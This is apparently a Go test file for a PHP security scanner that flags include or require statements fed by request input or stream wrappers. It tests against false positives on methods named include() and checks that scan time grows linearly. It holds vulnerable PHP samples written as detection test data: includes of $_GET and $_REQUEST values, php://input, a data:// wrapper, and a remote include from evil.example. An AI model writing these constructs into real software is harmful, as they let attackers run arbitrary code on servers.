package checks

import (
	"strings"
	"testing"
	"time"
)

// PHP 7 allows reserved words as method names, and a bootstrap method called
// include() is a common plugin idiom. The include-expression scanner accepted
// the keyword after "function " and then, because the expression walker treats
// "{" as a grouping depth rather than a block opener, swallowed the whole
// method body as the include target. Any request input anywhere in that method
// then read as an include of request input.
func TestDangerousIncludeIgnoresMethodNamedInclude(t *testing.T) {
	code := `<?php
class Plugin {
    public function __construct() {
        $this->include();
    }
    public function include() {
        require_once PLUGIN_DIR . 'inc/class-notifier.php';
        if ( ! empty( $_POST['id'] ) ) {
            $data = sanitize( $_POST['id'] );
        }
    }
}`
	if hasDangerousInclude(code) {
		t.Fatal("a method named include() whose body touches request input was reported as an include of request input")
	}
}

// The same shape with require, and via a static declaration.
func TestDangerousIncludeIgnoresFunctionNamedRequire(t *testing.T) {
	code := `<?php
function require_once_shim() {
    return true;
}
class A {
    public static function require() {
        $x = $_GET['p'];
        return $x;
    }
}`
	if hasDangerousInclude(code) {
		t.Fatal("a function/method named require() was reported as an include of request input")
	}
}

// The real construct must still be caught: an include whose target is request
// input, and one that reaches a remote or data wrapper.
func TestDangerousIncludeStillCatchesRealIncludes(t *testing.T) {
	for name, code := range map[string]string{
		"variable function": `<?php $function & include $_GET['page'];`,
		"constant function": `<?php A::function & include $_GET['page'];`,
		"property function": `<?php $a->function & include $_GET['page'];`,
		"request input":     `<?php include $_GET['page'] . '.php';`,
		"require input":     `<?php require_once($_REQUEST['tpl']);`,
		"data wrapper":      `<?php include 'data://text/plain;base64,SGVsbG8=';`,
		"php input":         `<?php include("php://input");`,
		"remote wrapper":    `<?php include_once 'http://evil.example/x.txt';`,
	} {
		if !hasDangerousInclude(code) {
			t.Errorf("%s: real dangerous include was not detected", name)
		}
	}
}

func TestDangerousIncludeDeclarationSeparators(t *testing.T) {
	for name, separator := range map[string]string{
		"long whitespace":   strings.Repeat(" ", 4096),
		"reference":         " &",
		"spaced reference":  " \n & \n ",
		"comment":           " /* " + strings.Repeat("comment ", 100) + " */ ",
		"reference comment": " /* comment */ & /* comment */ ",
	} {
		t.Run(name, func(t *testing.T) {
			for _, keyword := range includeKeywords {
				code := "<?php class A { function" + separator + keyword + "() { return $_GET['p']; } }"
				if hasDangerousInclude(stripPHPCommentsFromCode(code)) {
					t.Fatalf("method declaration %q was treated as an include", keyword)
				}
				code = "<?php class A { function" + separator + keyword + "() { include $_GET['p']; } }"
				if !hasDangerousInclude(stripPHPCommentsFromCode(code)) {
					t.Fatalf("real include inside method %q was missed", keyword)
				}
			}
		})
	}
}

func TestDangerousIncludeScalesLinearlyWithWhitespace(t *testing.T) {
	// The guard is against reintroducing the lookback at every byte offset,
	// which makes a long whitespace run quadratic. A wall-clock bound cannot
	// express that: CI runs this package under -race with coverage
	// instrumentation on a shared runner, where the same linear scan measured
	// 5s against 0.02s locally, so any absolute threshold either fails on a
	// busy runner or is too loose to mean anything. Growth is the property, so
	// measure growth: quadruple the input and compare.
	measure := func(spaces int) time.Duration {
		code := "<?php class A { function" + strings.Repeat(" ", spaces) + "include() { return $_GET['p']; } }"
		start := time.Now()
		if hasDangerousInclude(code) {
			t.Fatal("long declaration was treated as an include")
		}
		return time.Since(start)
	}

	// Warm the code path so first-call effects land outside the comparison.
	measure(1 << 16)

	const base = 1 << 20
	small := measure(base)
	large := measure(4 * base)

	// A timer floor keeps a sub-millisecond baseline from turning scheduler
	// jitter into a ratio. Linear growth is about 4x for 4x the input and
	// quadratic about 16x, so 8x separates them with room for a loaded runner.
	if small < time.Millisecond {
		small = time.Millisecond
	}
	if large > 8*small {
		t.Fatalf("include scan grew %v -> %v for 4x the whitespace, which is superlinear", small, large)
	}
}
